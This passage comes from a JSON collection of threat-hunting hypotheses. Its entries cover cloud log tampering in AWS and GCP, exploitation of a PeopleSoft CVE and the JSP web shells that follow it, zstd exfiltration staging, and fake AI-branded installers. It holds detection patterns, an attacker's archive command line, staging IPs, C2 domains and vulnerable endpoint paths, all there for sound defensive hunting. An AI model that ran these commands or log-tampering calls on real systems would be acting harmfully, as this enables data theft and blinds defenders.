    "references": "- [MITRE ATT&CK T1553.002 — Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)\n- [source report — OceanLotus: From external espionage to domestic targeting (ESET)](https://www.welivesecurity.com/en/eset-research/oceanlotus-external-espionage-domestic-targeting/)\n- [Splunk — Windows Unsigned MS DLL Side-Loading detection](https://research.splunk.com/endpoint/8d9e0e06-ba71-4dc5-be16-c1a46d58728c/)\n- [Detecting DLL hijacking with Sysmon, Chainsaw & custom Sigma rules](https://medium.com/@polygonben/detecting-dll-hijacking-with-sysmon-chainsaw-custom-sigma-rules-7e32215d5d96)\n- [Logpoint — Detect, prevent and respond: a deep dive on malicious DLLs](https://logpoint.com/en/blog/deep-dive-on-malicious-dlls)\n- [MITRE ATT&CK T1574.002 — Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)",
    "file_path": "Flames/H187.md"
  },
  {
    "id": "H188",
    "category": "Flames",
    "title": "Adversaries with valid AWS access stop, delete, or reconfigure CloudTrail trails to suppress audit visibility before sensitive IAM/S3/KMS actions; these tampering events are visible in CloudTrail as discrete management-plane API calls from non-console identities.",
    "tactic": "Defense Evasion",
    "notes": "Hunt CloudTrail management events where `eventSource=cloudtrail.amazonaws.com` and `eventName` in (`StopLogging`, `DeleteTrail`, `UpdateTrail`, `CreateTrail`, `PutEventSelectors`, `DeleteEventDataStore`). Filter to suspicious actors: `userIdentity.type` in (IAMUser, AssumedRole, FederatedUser) and `userIdentity.invokedBy != \"console.amazonaws.com\"` / `userAgent` not the AWS Console. For `UpdateTrail`, inspect `requestParameters` for changed `s3BucketName` (log redirection), removed `includeGlobalServiceEvents`/`isMultiRegionTrail`, or disabled `enableLogFileValidation`. For `StopLogging`, the trail named in `requestParameters.name` goes dark — confirm no benign `StartLogging` follows. Treat `errorCode = AccessDenied` on these as reconnaissance. Pivot: from `userIdentity.arn` + `userIdentity.accessKeyId`, list all subsequent events in the same trail/region (IAM CreateUser/AttachUserPolicy, S3 GetObject/DeleteObject, KMS Decrypt, EC2 export) to scope post-blinding actions. Also alert on the destination S3 bucket itself being deleted (`s3.amazonaws.com` `DeleteBucket`) or `update-trail` repointing to an attacker-controlled `--s3-bucket-name`.",
    "tags": [
      "defense_evasion",
      "cloud",
      "aws",
      "cloudtrail",
      "logging",
      "T1562.008"
    ],
    "techniques": [
      "T1562.008"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Unit 42's \"Blinding the Watchmen\" documents exactly these AWS primitives — `stop-logging`, `delete-trail`, `update-trail` (KMS/destination changes), `create-trail` for log routing, and S3 `delete-bucket` for destroying log storage — as a defense-evasion playbook, making them high-value hunt targets.\n- Every one of these is a discrete, named CloudTrail `eventName`, so the abuse is recorded in the very service being attacked (until it isn't) — ideal for a precise Flames hunt rather than a behavioral baseline.\n- Filtering to non-console `userAgent`/`invokedBy` cuts the dominant false-positive source (admins toggling trails from the console) and surfaces programmatic, credential-driven tampering, which is the attacker pattern.\n- The pivot from the tampering event to the same actor's subsequent IAM/S3/KMS activity converts a single suspicious API call into an attack-chain narrative, raising fidelity and giving responders immediate scoping.",
    "references": "- [MITRE ATT&CK T1562.008 — Impair Defenses: Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008/)\n- [source report — Unit 42: Blinding the Watchmen: Abusing Cloud Logging Services](https://unit42.paloaltonetworks.com/cloud-logging-defense-evasion/)\n- [Splunk — AWS Defense Evasion Stop Logging Cloudtrail](https://research.splunk.com/cloud/8a2f3ca2-4eb5-4389-a549-14063882e537/)\n- [Splunk — AWS Defense Evasion Delete Cloudtrail](https://research.splunk.com/cloud/82092925-9ca1-4e06-98b8-85a2d3889552/)\n- [Splunk — AWS Defense Evasion Update Cloudtrail](https://research.splunk.com/cloud/7c921d28-ef48-4f1b-85b3-0af8af7697db/)\n- [Elastic — AWS CloudTrail Log Deleted (prebuilt rule)](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/integrations/aws/defense_evasion_cloudtrail_logging_deleted)\n- [AWS — Security best practices in CloudTrail (DeleteTrail/StopLogging/UpdateTrail access control)](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html)",
    "file_path": "Flames/H188.md"
  },
  {
    "id": "H189",
    "category": "Flames",
    "title": "Adversaries in GCP delete, disable, or redirect Cloud Logging sinks and delete log buckets to break log routing and storage, blinding defenders; these actions appear in Cloud Audit Logs as discrete ConfigServiceV2 method calls.",
    "tactic": "Defense Evasion",
    "notes": "Query GCP Cloud Audit Logs (`logName` ending `/logs/cloudaudit.googleapis.com%2Factivity`) where `protoPayload.methodName` in (`google.logging.v2.ConfigServiceV2.DeleteSink`, `google.logging.v2.ConfigServiceV2.UpdateSink`, `google.logging.v2.ConfigServiceV2.DeleteBucket`, `google.logging.v2.ConfigServiceV2.CreateSink`). For `UpdateSink`, inspect `protoPayload.request` for `disabled=true` (sink silenced) or a changed `destination` (log redirection to attacker storage/another project). For `DeleteSink`/`DeleteBucket`, capture `protoPayload.resourceName` to identify which sink/bucket (watch for `_Default` / `_Required`). Identify the actor via `protoPayload.authenticationInfo.principalEmail` and source `protoPayload.requestMetadata.callerIp`; flag service-account principals and unfamiliar IPs. Also hunt CMEK impairment via `google.logging.v2.ConfigServiceV2.UpdateBucket` changing `cmekSettings` (key rotation/removal that breaks log readability). Pivot: from `principalEmail`, pull all Admin Activity in the project/folder window (IAM SetIamPolicy, storage.objects.delete, serviceusage.services.disable) to scope post-blinding actions. Treat `protoPayload.status.code != 0` (permission-denied) on these methods as recon.",
    "tags": [
      "defense_evasion",
      "cloud",
      "gcp",
      "cloud_logging",
      "logging",
      "T1562.008"
    ],
    "techniques": [
      "T1562.008"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Unit 42's report enumerates the GCP-side blinding primitives directly — deleting log routers (`DeleteSink`), disabling a sink (`disabled=true`), redirecting routing (`logging.sinks.update` destination change), deleting log storage (`logging.buckets.delete`), and CMEK impairment — establishing these as concrete hunt targets, not theory.\n- Each maps to a named `protoPayload.methodName` in GCP Cloud Audit Logs, so this is a precise Flames hunt against the log router/storage control plane rather than a behavioral baseline.\n- `UpdateSink` with `disabled=true` or a changed `destination` is a quieter evasion than outright deletion — explicitly inspecting the request body catches the stealthier variant that a deletion-only rule would miss.\n- Sister hunt [[H188]] covers the identical adversary behavior on AWS; running both gives multi-cloud coverage of T1562.008 with provider-native field paths and a consistent pivot-to-actor methodology.",
    "references": "- [MITRE ATT&CK T1562.008 — Impair Defenses: Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008/)\n- [source report — Unit 42: Blinding the Watchmen: Abusing Cloud Logging Services](https://unit42.paloaltonetworks.com/cloud-logging-defense-evasion/)\n- [Elastic — GCP Logging Sink Deletion (prebuilt rule)](https://www.elastic.co/guide/en/security/current/gcp-logging-sink-deletion.html)\n- [Elastic — GCP Logging Bucket Deletion (prebuilt rule)](https://www.elastic.co/guide/en/security/current/gcp-logging-bucket-deletion.html)\n- [Detection.FYI — GCP Logging Sink Deletion](https://detection.fyi/elastic/detection-rules/integrations/gcp/defense_evasion_gcp_logging_sink_deletion/)\n- [Cloudanix — google.logging.v2.ConfigServiceV2.DeleteSink threat detail](https://cloudanix.com/docs/gcp/threats/logging/rules/google.logging.v2.configservicev2.deletesink)\n- [Picus — T1562.008 Impair Defenses: Disable or Modify Cloud Logs (AWS/GCP/Azure methods)](https://www.picussecurity.com/resource/blog/t1562-008-disable-or-modify-cloud-logs)",
    "file_path": "Flames/H189.md"
  },
  {
    "id": "H190",
    "category": "Flames",
    "title": "An adversary is exploiting CVE-2026-35273 by sending crafted unauthenticated POSTs to PeopleSoft PSEMHUB/PSIGW endpoints to achieve RCE/SSRF on the public-facing PIA/WebLogic server.",
    "tactic": "Initial Access",
    "notes": "Hunt WebLogic/PIA access logs for `POST /PSEMHUB/hub` and `POST /PSIGW/HttpListeningConnector` from external/non-allowlisted IPs (these endpoints normally take only internal EMHub agent traffic). Flag any such request whose body/headers contain SSRF callback markers `127.0.0.1`, `localhost`, `::1`, or RFC1918 addresses. Correlate with the PIA/WebLogic Java process (`java`/`PSEMAGENT`) spawning shell children (`/bin/sh`, `bash`, `sshpass`, `node`) via Linux auditd `execve` or Sysmon-for-Linux EID 1 where parent is the WebLogic process — web-server-spawns-shell is the single highest-fidelity T1190 signal. Pivot on outbound TCP/445 (SMB) from PeopleSoft hosts to external destinations (NetFlow) and unexpected egress to staging IPs `142.11.200.186-190` (Python SimpleHTTP on 8888) or `azurenetfiles.net` / `176.120.22.24`. WAF: add signature for these URIs + loopback-in-body.",
    "tags": [
      "initial_access",
      "peoplesoft",
      "cve_2026_35273",
      "ssrf",
      "shinyhunters",
      "weblogic",
      "T1190"
    ],
    "techniques": [
      "T1190"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- These two endpoints (`/PSEMHUB/hub`, `/PSIGW/HttpListeningConnector`) are the precise vulnerable surfaces for CVE-2026-35273 and legitimately receive only internal EMHub/integration-broker traffic, so external POSTs are inherently anomalous and high-signal.\n- The vuln is fundamentally an SSRF-to-RCE, so loopback/internal-IP markers in the request and unexpected outbound connections from the PIA server are direct exploitation evidence rather than generic noise.\n- Exploitation was an active zero-day before Oracle's 10 June 2026 out-of-band patch, so log review must cover the 27 May–9 June window even on now-patched systems to catch prior compromise.\n- A web server (WebLogic) spawning an interpreter or `sshpass`/`node` is rare in normal PeopleSoft operation and ties the network indicator to host-level RCE.",
    "references": "- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)\n- [source report — Google Cloud / Mandiant: ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit](https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/)\n- [Rapid7 — Active Exploitation of Oracle PeopleSoft Zero-Day (CVE-2026-35273)](https://www.rapid7.com/blog/post/etr-active-exploitation-of-oracle-peoplesoft-zero-day-cve-2026-35273/)\n- [BleepingComputer — Oracle mitigates PeopleSoft zero-day exploited in data theft attacks](https://www.bleepingcomputer.com/news/security/oracle-mitigates-peoplesoft-zero-day-exploited-in-data-theft-attacks/)\n- [Splunk Security Content — Exploit Public-Facing Application (Web datamodel POST/URI detection patterns)](https://research.splunk.com/web/19a481e0-c97c-4d14-b1db-75a708eb592e/)\n- [Log360 — Detecting Exploit Public-Facing Application (T1190) with SIEM](https://www.manageengine.com/log-management/mitre-attack/initial-access/exploit-public-facing-application-t1190.html)",
    "file_path": "Flames/H190.md"
  },
  {
    "id": "H191",
    "category": "Flames",
    "title": "An adversary has written a JSP web shell (or XMLDecoder-abusing XML) into the PeopleSoft PSEMHUB.war web root to persist RCE on the public-facing PIA/WebLogic server.",
    "tactic": "Persistence",
    "notes": "Inventory and hunt for newly created/modified `*.jsp` under `<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/` — legitimate PSEMHUB.war contents are static and shipped by Oracle, so any new/changed JSP is suspect. Specifically audit unauthorized staging dirs `PSEMHUB.war/envmetadata/transactions/` and anomalous subdirs named `logs`, `persistantstorage`, `scratchpad`. Flag recently modified XML in `<docroot>/envmetadata/data/environment/*.xml` (XMLDecoder RCE on restart). Detection: Linux auditd file-create watch (`-w <PS_CFG_HOME>/webserv -p wa`) or Sysmon-for-Linux EID 11 for `.jsp`/`.xml` creations in those paths; FIM baseline + diff of PSEMHUB.war. Behavioral: WebLogic `java` process spawning child shells/`whoami`/`id`/`uname`/`ifconfig` (Sigma \"Linux Webshell Indicators\" — web-server parent → recon child). Grep access logs for GETs/POSTs to unfamiliar `.jsp` paths under `/PSEMHUB/`.",
    "tags": [
      "persistence",
      "webshell",
      "jsp",
      "peoplesoft",
      "psemhub",
      "weblogic",
      "xmldecoder",
      "T1505.003"
    ],
    "techniques": [
      "T1505.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- PSEMHUB.war is an Oracle-shipped static application; any newly created `.jsp` or modified XML inside it is almost never legitimate, making file-creation events in that exact path extremely high fidelity.\n- The report names the precise persistence paths and the unauthorized `transactions/`, `logs`, `persistantstorage`, `scratchpad` directories, so the hunt can target real locations rather than monitoring the whole filesystem.\n- The XMLDecoder XML path is a stealth backdoor that fires on application restart, so a host can be reinfected post-reboot even after a JSP shell is removed — both must be checked.\n- A WebLogic Java process spawning recon utilities is a well-established cross-vendor web-shell behavioral signature and ties file-system persistence to live operator interaction.",
    "references": "- [MITRE ATT&CK T1505.003 — Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n- [source report — Google Cloud / Mandiant: ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit](https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/)\n- [Detection.FYI / SigmaHQ — Linux Webshell Indicators (web-server parent spawning recon child)](https://detection.fyi/sigmahq/sigma/linux/process_creation/proc_creation_lnx_webshell_detection/)\n- [Atomic Red Team — T1505.003 Server Software Component: Web Shell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.003/T1505.003.md)\n- [microsoft/MSTIC-Sysmon — T1505.003 WebShell SuspSubProcesses (Linux Sysmon config)](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/attack-based/persistence/T1505.003_WebShell_SuspSubProcesses.xml)\n- [WA Cyber Security Unit — T1505.003 Linux Webshell Indicators hunt guide](https://soc.cyber.wa.gov.au/guidelines/TTP_Hunt/ADS_forms/T1505.003-Linux-Webshell-Indicators/)",
    "file_path": "Flames/H191.md"
  },
  {
    "id": "H192",
    "category": "Flames",
    "title": "An adversary archived/compressed harvested PeopleSoft data with zstd/tar in a staging directory before exfiltrating it over SSH to an external leak-site mirror.",
    "tactic": "Collection",
    "notes": "Hunt Linux auditd/Sysmon-for-Linux `execve` (EID 1) for `zstd` invocations — observed exact pattern: `pv -s \"$(du -sb exfil ...)\" | zstd -3 -T0 -o exfil.tar.zst`. Flag `zstd`/`tar`/`gzip`/`xz` run with high thread/compression flags (`-T0`, `-3`) by non-admin/web-service users, or as a child of a web/SSH session originating from the intrusion. Correlate execution with creation (EID 11 / auditd watch on `/tmp`, `/var/tmp`, app dirs) of large `*.tar.zst` / `*.tar.gz` files, especially named `exfil*`. Pivot: `pv`+`zstd` pipe is itself unusual on a PeopleSoft prod server. Then tie the resulting archive to outbound SSH/SCP from the PeopleSoft host to external IPs (notably `176.120.22.24` / `142.11.200.186-190`). For an anomaly variant, baseline normal nightly backup archive sizes/locations and alert on off-schedule, oversized archives or archives written outside backup paths.",
    "tags": [
      "collection",
      "zstd",
      "archive",
      "exfil_staging",
      "peoplesoft",
      "shinyhunters",
      "T1560.001"
    ],
    "techniques": [
      "T1560.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The report gives the exact `pv | zstd -3 -T0 -o exfil.tar.zst` command line, so the hunt can match a precise, rarely-legitimate process-and-pipe pattern rather than generic compression noise.\n- `zstd` driven by `pv` for progress is an interactive-operator pattern that almost never appears in automated PeopleSoft backups, making it a strong behavioral discriminator.\n- Catching the archive-staging step provides a detection window after collection but before data leaves the network, enabling response before publication on the leak site.\n- The resulting artifact and subsequent outbound SSH to the named DLS mirror chain collection directly to exfiltration, supporting confident triage.",
    "references": "- [MITRE ATT&CK T1560.001 — Archive Collected Data: Archive via Utility](https://attack.mitre.org/techniques/T1560/001/)\n- [source report — Google Cloud / Mandiant: ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit](https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/)\n- [MITRE ATT&CK Detection Strategy DET0298 — Archiving via Utility (Linux execve + staging-dir correlation)](https://attack.mitre.org/detectionstrategies/DET0298/)\n- [Atomic Red Team — T1560.001 Archive via Utility](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md)\n- [Log360 — Detecting Archive Collected Data (T1560) with SIEM](https://www.manageengine.com/log-management/mitre-attack/collection/t1560-archive-collected-data.html)\n- [CISA Eviction Strategies Tool — T1560.001](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1560.001)",
    "file_path": "Flames/H192.md"
  },
  {
    "id": "H193",
    "category": "Flames",
    "title": "Adversaries lure users into running AI-branded fake installers (`*AI*Setup.exe`, `deepseek-v4*.exe`, `*Flux*Ai*.exe`) that drop a renamed `pythonw.exe` + `LICENSE.txt` into `%AppData%\\Local` and execute a Python downloader beaconing to a stealer C2.",
    "tactic": "Execution",
    "notes": "Endpoint: pivot on Sysmon EID 1 / DeviceProcessEvents where a recently-downloaded installer with an AI-brand token in `ProcessVersionInfoFileDescription`/filename spawns a child interpreter. Process lineage to hunt: `*.exe` (installer in `\\Downloads\\` or `\\Programs\\IA *`) -> `\\AppData\\Local\\pythonw.exe` (no/odd args) -> outbound. File creation (Sysmon EID 11) of `pythonw.exe` AND `LICENSE.txt` co-located in `%AppData%\\Local`. Flag signed binaries whose signer cert is revoked or chains to known MSaaS (e.g., Fox Tempest, cert thumbprint `4f5c5b3ef45cfff7721754487a86aeff9a2e6e32`). KQL: DeviceProcessEvents where InitiatingProcessFolderPath has_any(\"downloads\",\"\\\\programs\\\\\") and FileName==\"pythonw.exe\" and FolderPath has \"appdata\\\\local\"; join DeviceNetworkEvents for first-seen C2 (`brokeapt[.]com`, `pan.ssffaa19[.]xyz`, `pan.rongtv[.]xyz`). Known IOCs (hash-rotating, treat as starting points, not the hunt): `ProFluxeFlowAi-win-Setup.exe` c7c5072d..., shared loader 5455341e...",
    "tags": [
      "execution",
      "infostealer",
      "vidar",
      "ai_lure",
      "masquerading",
      "fake_installer",
      "T1204.002"
    ],
    "techniques": [
      "T1204.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The article documents a repeatable, hash-rotating ecosystem (GPT-5.5, Claude Code, Kimi, Gemma, GrokCLI, Manus AI, FraudGPT) reusing one loader hash, so behavioral hunting on the execution chain outlives any single IOC.\n- The drop pattern is specific and uncommon for benign software: a renamed `pythonw.exe` plus `LICENSE.txt` decoy under `%AppData%\\Local` driving a downloader — strong, low-noise signal.\n- Signed-but-revoked / MSaaS-signed installers (Fox Tempest) defeat reputation checks, so signer-anomaly + path-anomaly pivots catch what AV reputation misses.\n- Single campaigns reached 66,000 devices in a day with hours-to-impact timelines, so a standing hunt materially shrinks dwell time on commodity stealer infections.",
    "references": "- [MITRE ATT&CK T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)\n- [source report — Microsoft: AI brands as bait](https://www.microsoft.com/en-us/security/blog/2026/06/08/ai-brands-as-bait-how-threat-actors-are-using-the-ai-hype-in-social-engineering/)\n- [Microsoft — Hunting Infostealers: Python Stealers (KQL/hunting guidance)](https://techcommunity.microsoft.com/blog/microsoftsecurityexperts/hunting-infostealers---python-stealers/4505342)\n- [Detection.FYI — Execute Python Scripts via Python Installer Binary (Sigma: pythonw.exe under \\AppData\\ from setup.exe)](https://detection.fyi/tsale/sigma_rules/lol_bins/proc_creation_windows_setup_pythonw/)\n- [Huntress — Snakes on a Domain: Analysis of a Python Malware Loader](https://www.huntress.com/blog/snakes-on-a-domain-an-analysis-of-a-python-malware-loader)\n- [Acronis TRU — Vidar Stealer 2.0 distributed via fake repos on GitHub](https://www.acronis.com/en/tru/posts/vidar-stealer-20-distributed-via-fake-game-cheats-on-github-and-reddit/)",
    "file_path": "Flames/H193.md"
  },
  {
    "id": "M001",
    "category": "Alchemy",
    "title": "A machine learning model can detect anomalies in user login patterns that indicate compromised accounts.",
    "tactic": "Initial Access",
    "notes": "Machine learning model trained on historical login data to identify deviations from normal behavior",
    "tags": [
      "modelassisted",
      "machinelearning",
      "anomalydetection",
      "userbehavior"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://x.com/letswastetime"
    },
    "why": "- ML identifies unusual login patterns, such as unusual times, locations, or device types, which are strong indicators of account takeover attempts.\n- By learning from recent login data, ML can adapt to detect sophisticated attacks, like credential stuffing or lateral movement, that might evade static detection rules.\n- Compare current login behaviors against personalized user baselines and find potential compromise.",
    "references": "- https://attack.mitre.org/techniques/T1078/002/\n- https://plat.ai/blog/anomaly-detection-machine-learning/\n- https://docs.splunk.com/Documentation/MLApp/5.4.2/User/IDuseraccessanoms\n- https://www.elastic.co/guide/en/machine-learning/current/ootb-ml-jobs-siem.html",
    "file_path": "Alchemy/M001.md"
  },
  {
    "id": "M002",
    "category": "Alchemy",
    "title": "Beaconing behavior can be detected in encrypted DNS traffic patterns by applying machine learning models that identify anomalous, periodic communication indicative of command and control activity.",
    "tactic": "Command and Control",
    "notes": "Encrypted DNS traffic (e.g., DoH) may be used to hide beaconing communications, making it harder to detect.",
    "tags": [
      "commandandcontrol",
      "beaconing",
      "dns",
      "machinelearning"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://x.com/letswastetime"
    },
    "why": "- Detect hidden beaconing activities by analyzing patterns in encrypted DNS traffic that deviate from typical usage.\n- Apply machine learning models to identify anomalies in encrypted DNS traffic, such as regular, periodic connections that suggest beaconing.\n- Enhance detection capabilities for encrypted communications channels that attackers may exploit to hide their C2 activities.",
    "references": "- https://attack.mitre.org/techniques/T1071/004/\n- https://unit42.paloaltonetworks.com/profiling-detecting-malicious-dns-traffic/\n- https://suleman-qutb.medium.com/using-machine-learning-for-dns-exfiltration-tunnel-detection-418376b555fa",
    "file_path": "Alchemy/M002.md"
  },
  {
    "id": "M003",
    "category": "Alchemy",
    "title": "Machine learning models can identify anomalies with user or systems initiating outbound traffic with unusually large byte sizes that may indicate potential data exfiltration activity.",
    "tactic": "Exfiltration",
    "notes": "Unusual Byte Size: Outbound packets significantly larger than the typical size associated with normal business transactions.",
    "tags": [
      "exfiltration",
      "machinelearning"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "John Grageda",
      "link": "https://www.linkedin.com/in/johngrageda/"
    },
    "why": "- Data exfiltration is a significant threat where sensitive information is transferred outside the organization. \n- Analyzing byte sizes of outbound traffic can help detect unusual patterns that may indicate unauthorized data transfer.\n- Correlate unusual byte sizes and spikes in outbound traffic volume during non-standard business hours focusing on file extensions known for containing sensitive information.",
    "references": "- https://attack.mitre.org/techniques/T1030/\n- https://thehackernews.com/2023/06/unveiling-unseen-identifying-data.html\n- https://darktrace.com/blog/bytesize-security-examining-an-insider-exfiltrating-corporate-data-from-a-singaporean-file-server-to-google-cloud",
    "file_path": "Alchemy/M003.md"
  },
  {
    "id": "M004",
    "category": "Alchemy",
    "title": "Machine learning models can identify database query anomalies indicating potential data manipulation or exfiltration activity.",
    "tactic": "Impact",
    "notes": "If a user or system executes an unusually high number of data modification queries (e.gl, INSERT, UPDATE, DELETE) within a short timeframe, particularly in sensitive databases, it may indicate potential data manipulation or exfiltration activities.",
    "tags": [
      "impact",
      "machinelearning"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "John Grageda",
      "link": "https://www.linkedin.com/in/johngrageda/"
    },
    "why": "- Data manipulation, including unauthorized changes or deletions, can be a sign of insider threats or external attacks.\n- A significant increase in the number of database modification queries (e.g., more than 100 modifications in an hour).\n- Modifications occurring in critical or sensitive database tables that typically have restricted access.\n- Database queries being executed by users who do not usually interact with those tables or databases.\n- Execution of queries that do not align with normal business operations (e.g., mass deletions or updates).",
    "references": "- https://attack.mitre.org/techniques/T1565/001/\n- https://www.mandiant.com/sites/default/files/2021-09/rpt-apt38-2018-web_v5-1.pdf",
    "file_path": "Alchemy/M004.md"
  },
  {
    "id": "M005",
    "category": "Alchemy",
    "title": "Machine learning models can detect command-line obfuscation via Base64 encoding, which adversaries may use to evade detection.",
    "tactic": "Defense Evasion",
    "notes": "Adversaries can use Base64 encoded commands and scripts in a variety of interpreters, such as PowerShell, Windows Command Shell, and Bash.",
    "tags": [
      "defenseevasion",
      "obfuscation"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Audra Streetman",
      "link": "https://x.com/audrastreetman"
    },
    "why": "- Encoded commands and scripts are more difficult to signature and analyze. \n- Machine learning models can detect and decode Base64 commands, flag unusually long commands, and detect commands that match patterns of obfuscation. \n- A number of adversaries have used Base64 to obfuscate commands and scripts, including APT19, Wizard Spider, and Fox Kitten. It is also a feature of remote access tools such as ComRAT and DarkWatchman.",
    "references": "- https://attack.mitre.org/techniques/T1027/010/\n- https://research.splunk.com/endpoint/c4db14d9-7909-48b4-a054-aa14d89dbb19/\n- https://medium.com/@Mr.AnyThink/threat-hunting-encoded-powershell-commands-part-2-monitoring-and-detecting-powershell-commands-f003742a34d7\n- https://cloud.google.com/blog/topics/threat-intelligence/malicious-powershell-detection-via-machine-learning\n- https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/Guided%20Hunting%20-%20Base64-Encoded%20Linux%20Commands.ipynb",
    "file_path": "Alchemy/M005.md"
  },
  {
    "id": "M006",
    "category": "Alchemy",
    "title": "Dictionary-based DGAs are a rare threat that require a model-based approach. These domains are algorithmically generated based on a dictionary of source words. Like traditional Domain Generation Algorithms, machine learning models can distinguish DGA / Non-DGA domains by training on sample data to learn on lexical features separating the classes.",
    "tactic": "Command and Control",
    "notes": "<ul><li>Deploying a model-based detection against a high-volume logging source like web traffic can be costly and resource-intensive. For this task, I recommend a retroactive hunt using a deduplicated list of domains, enabling a quick and efficient M-ATH method for finding threats, or at least reducing our dataset for hunting.</br><li>This is an evolving research area. Efficacy of a model may be heavily tied to the timeliness of the data, or the inclusion of the target malware family in the underlying training set.</br><li>Sample data and pre-trained models are available for this hunt, however it is also possible to generate new data by modifying the reverse-engineered DGA algorithms [here](https://github.com/baderj/domain_generation_algorithms).</br><li>False positives may be caused by Content Delivery Networks, Ad-tracking mechanisms.",
    "tags": [
      "commandandcontrol",
      "t1568_002",
      "dga",
      "T1568.002"
    ],
    "techniques": [
      "T1568.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Ryan Fetterman",
      "link": "https://github.com/fetterm4n"
    },
    "why": "- An incident discovered via this method is likely a high severity / high impact finding.",
    "references": "- https://attack.mitre.org/techniques/T1568/002/\n- https://www.splunk.com/en_us/blog/security/threat-hunting-for-dictionary-dga-with-peak.html\n- https://github.com/splunk/PEAK/tree/main/dictionary_dga_classifier",
    "file_path": "Alchemy/M006.md"
  },
  {
    "id": "M007",
    "category": "Alchemy",
    "title": "Compare text-based features of artifacts (User agent strings, Malware / Executables, Browser Extensions) by encoding them with a text-vectorizer. Vectorization creates a numerical representation of the text-based feature which can then be clustered, or directly compared via a variety of similarity measures.",
    "tactic": "Command and Control, Execution",
    "notes": "<ul><li>Data Collection and Preparation: Gather and encode data into numerical formats to support analysis (e.g., text vectorization or image hashing).</br><li>Similarity Analysis: Use similarity metrics (e.g., Levenshtein, cosine, or hash-based) to find related patterns or anomalies.</br><li>Clustering: Apply clustering (e.g., K-means) to group similar items, visualizing patterns and outliers.</br><li>Prioritization and Investigation: Flag clusters or anomalies for deeper analysis, focusing on items of interest or risk.",
    "tags": [
      "command_and_control",
      "execution",
      "T1071.001",
      "T1203"
    ],
    "techniques": [
      "T1071.001",
      "T1203"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Ryan Fetterman",
      "link": "https://github.com/fetterm4n"
    },
    "why": "- This is an important Model-Assisted methodology which can be applied to hunt for multiple types of threats.\n- This hunt is grounded in two examples which showcase clustering vectorized text fields, and application of similarity measures pre- and post-vectorization, like Levenshtein, hamming, and euclidean distance.",
    "references": "- https://www.splunk.com/en_us/blog/tips-and-tricks/text-vectorisation-clustering-and-similarity-analysis-with-splunk-exploring-user-agent-strings-at-scale.html\n- https://www.splunk.com/en_us/blog/security/add-to-chrome-part-4-threat-hunting-in-3-dimensions-m-ath-in-the-chrome-web-store.html\n- https://attack.mitre.org/techniques/T1203/\n- https://attack.mitre.org/techniques/T1071/001/\n- https://www.geeksforgeeks.org/vectorization-techniques-in-nlp/",
    "file_path": "Alchemy/M007.md"
  },
  {
    "id": "M008",
    "category": "Alchemy",
    "title": "Cluster process parent-child execution chains across the endpoint fleet to establish baseline lineage frequency, then identify rare or never-seen process trees that deviate from the norm to detect living-off-the-land abuse, novel malware execution, and compromised applications.",
    "tactic": "Execution",
    "notes": "Build frequency counts of parent→child process pairs across the fleet over a baseline period. Pairs seen on less than 1% of endpoints or appearing for the first time are flagged for review. Effective across multiple ATT&CK tactics since most attack chains produce abnormal process trees regardless of the specific technique used.",
    "tags": [
      "execution",
      "defense_evasion",
      "model_assisted",
      "process_lineage",
      "clustering",
      "anomaly_detection",
      "T1059",
      "T1218"
    ],
    "techniques": [
      "T1059",
      "T1218"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
